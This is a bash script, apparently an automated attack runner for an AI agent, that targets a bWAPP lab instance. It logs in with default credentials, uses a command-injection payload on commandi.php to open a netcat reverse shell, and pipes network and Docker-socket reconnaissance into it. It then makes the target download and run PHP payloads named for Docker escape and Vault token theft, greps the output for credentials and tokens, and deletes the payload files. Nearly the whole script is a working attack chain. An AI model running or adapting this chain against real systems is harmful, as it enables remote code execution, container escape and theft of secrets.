#!/bin/bash
# ================================================
# bWAPP AI Agent Runner (Named Pipe + Log Reset)
# Target : http://clientc.local:8002
# Workspace: /home/kali/.openclaw/workspace/logs
# ================================================

set -e

# -----------------------------------------------
# 경로 및 환경 설정
# -----------------------------------------------
TARGET="http://clientc.local:8002"
RESOLVE="--resolve clientc.local:8002:172.17.96.1"
PHP_DIR="/tmp"

WORKSPACE_LOG_DIR="/home/kali/.openclaw/workspace/logs"
REPORT="$WORKSPACE_LOG_DIR/agent_report.log"
REV_SHELL_LOG="$WORKSPACE_LOG_DIR/reverse_shell_test.log"
COOKIE_FILE="$WORKSPACE_LOG_DIR/bwapp_cookie.txt"
LOG_PREFIX="[AGENT]"

ATTACK_CHAIN=(
  "get_images.php"
  "escape_shadow.php"
  "get.php"
  "vault_exec.php"
  "create_token.php"
  "scan_token.php"
)

# 워크스페이스 폴더 생성
mkdir -p "$WORKSPACE_LOG_DIR"

rm -f "$REPORT" "$REV_SHELL_LOG" "$COOKIE_FILE"

log() {
  echo "$LOG_PREFIX $(date '+%H:%M:%S') | $1" | tee -a "$REPORT"
}

# -----------------------------------------------
# Phase 0~2: 사전 점검 및 인증
# -----------------------------------------------
log "Phase 0~2 - Initialization & Auth"

touch "$COOKIE_FILE"
chmod 666 "$COOKIE_FILE"

curl -s $RESOLVE -c "$COOKIE_FILE" "$TARGET/login.php" > /dev/null
curl -s -L $RESOLVE -b "$COOKIE_FILE" -c "$COOKIE_FILE" \
  -d "login=bee&password=bug&security_level=0&form=submit" \
  "$TARGET/login.php" > /dev/null

PORTAL_CHECK=$(curl -s $RESOLVE -b "$COOKIE_FILE" "$TARGET/portal.php")
if ! echo "$PORTAL_CHECK" | grep -qi "Welcome.*bee"; then
  log "FAIL: Session not valid."
  exit 1
fi
log "Login SUCCESS - Session Secured."

# -----------------------------------------------
# Phase 3: Interactive Reverse Shell 세팅
# -----------------------------------------------
log "Phase 3 - Establishing Interactive Reverse Shell"

KALI_IP=$(hostname -I | awk '{print $1}')
LPORT=4444

# 1. 파이프(Named Pipe) 및 파일 디스크립터 3번 생성
PIPE="/tmp/agent_pipe"
rm -f "$PIPE"
mkfifo "$PIPE"
exec 3<> "$PIPE"

# 2. 리스너 실행 (입력을 3번 파이프에서 받음)
log "Starting local listener on port $LPORT with Named Pipe..."
nc -lvnp $LPORT <&3 > "$REV_SHELL_LOG" 2>&1 &
NC_PID=$!
sleep 1

# 3. 리버스 쉘 트리거
PAYLOAD="127.0.0.1; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $KALI_IP $LPORT >/tmp/f"
log "Triggering Reverse Shell via commandi.php..."
curl -s $RESOLVE -b "$COOKIE_FILE" \
  --data-urlencode "target=$PAYLOAD" \
  --data-urlencode "form=submit" \
  "$TARGET/commandi.php" > /dev/null &

sleep 3

if grep -qi "connect" "$REV_SHELL_LOG"; then
  log "SUCCESS: Reverse Connection established! Shell is active."
else
  log "FAIL: Reverse Connection failed."
  exec 3>&-
  exit 1
fi

# -----------------------------------------------
# Phase 4: Internal Network Scan (Pipeline Injection)
# -----------------------------------------------
log "Phase 4 - Internal Network & Docker Socket Scan (via Shell)"

echo "echo '--- [Internal Network Scan] ---'" >&3
echo "ip a" >&3
echo "ip route" >&3
echo "ls -al /var/run/docker.sock" >&3
sleep 2

# -----------------------------------------------
# Phase 5: Payload Chaining (Docker Escape & Vault)
# -----------------------------------------------
log "Phase 5 - Executing Multi-Payload Attack Chain"

cd "$PHP_DIR"
python3 -m http.server 7000 > /dev/null 2>&1 &
PY_PID=$!
sleep 2

for PAYLOAD in "${ATTACK_CHAIN[@]}"; do
  log "------------------------------------------------"
  log "[Injecting Payload] : $PAYLOAD"
  
  echo "echo ' '" >&3
  echo "echo '====================================='" >&3
  echo "echo '>>> [STARTING] $PAYLOAD'" >&3
  
  # 다운로드 및 권한 부여
  echo "php -r \"copy('http://$KALI_IP:7000/$PAYLOAD', '/tmp/$PAYLOAD');\"" >&3
  echo "chmod +x /tmp/$PAYLOAD" >&3
  sleep 1 # 다운로드가 끝날 시간을 1초 보장
  
  # 🔥 핵심: 페이로드를 백그라운드(&)로 실행하여 쉘의 프롬프트가 즉시 반환되도록 함
  echo "php /tmp/$PAYLOAD > /tmp/${PAYLOAD}.out 2>&1 &" >&3
  
  # Vault 관련 무거운 작업은 넉넉하게 대기 (백그라운드에서 돌고 있으므로 쉘은 멈추지 않음)
  if [[ "$PAYLOAD" == *"token"* || "$PAYLOAD" == *"vault"* ]]; then
    sleep 8
  else
    sleep 4
  fi
  
  # 백그라운드 실행 결과를 화면에 출력하고 마커 찍기
  echo "cat /tmp/${PAYLOAD}.out" >&3
  echo "echo '>>> [FINISHED] $PAYLOAD'" >&3
  echo "echo '====================================='" >&3
  sleep 1
done

kill $PY_PID 2>/dev/null || true

# -----------------------------------------------
# Phase 6: Result Extraction & Cleanup
# -----------------------------------------------
log "Phase 6 - Result Extraction & Cleanup"

# 파이프라인 닫기 전 쉘이 모든 출력을 뱉어낼 마지막 유예 시간
sleep 5 

for PAYLOAD in "${ATTACK_CHAIN[@]}"; do
  echo "rm -f /tmp/$PAYLOAD" >&3
done

echo "exit" >&3
sleep 1
exec 3>&-
rm -f "$PIPE"

# -----------------------------------------------
# 최종 리포트 정리
# -----------------------------------------------
log "Extracting results from Reverse Shell Log..."
log "--- [Key Exfiltrated Data] ---"
# 디버깅 마커가 모두 제대로 찍혔는지 확인하기 위해 리포트에 포함시킵니다.
cat "$REV_SHELL_LOG" | grep -E "root:|Client|token|Vault|eth0|docker.sock|192.168|>>>" | tee -a "$REPORT"
log "------------------------------"

log "=== Full Scenario COMPLETE === Report: $REPORT"
